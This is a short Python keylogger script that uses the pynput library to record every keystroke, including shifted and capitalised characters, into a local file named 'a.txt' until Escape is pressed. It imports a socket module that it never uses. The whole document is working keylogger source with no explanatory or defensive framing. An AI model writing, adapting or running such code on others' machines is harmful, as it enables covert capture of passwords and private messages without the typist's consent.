from pynput import keyboard
import socket



f = open("a.txt","wb")

openedCapslock = False
stickedToShift = False
def on_press(key):
    global openedCapslock
    global stickedToShift

    try:
        if(key == keyboard.Key.backspace):
            f.seek(-1,2)
            f.truncate()
        elif(key == keyboard.Key.space):
            f.write(" ".encode())
        elif(key == keyboard.Key.enter):
            f.write("\n".encode())
        elif(key == keyboard.Key.tab):
            f.write("    ".encode()) # four space tab
        elif(key == keyboard.Key.ctrl):
            f.write("$ctrl$".encode())
        elif(key == keyboard.Key.caps_lock):
            openedCapslock = not openedCapslock
        elif(key == keyboard.Key.shift):
            stickedToShift = True
        else:
            if((openedCapslock and not stickedToShift) or (stickedToShift and not openedCapslock)): 
                f.write(key.char.upper().encode())
            else: 
                f.write(key.char.lower().encode())
    except AttributeError:
        pass
 

def on_release(key):
    global stickedToShift
    if(key == keyboard.Key.shift):
        stickedToShift = False

    if key == keyboard.Key.esc:
        f.close()
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()


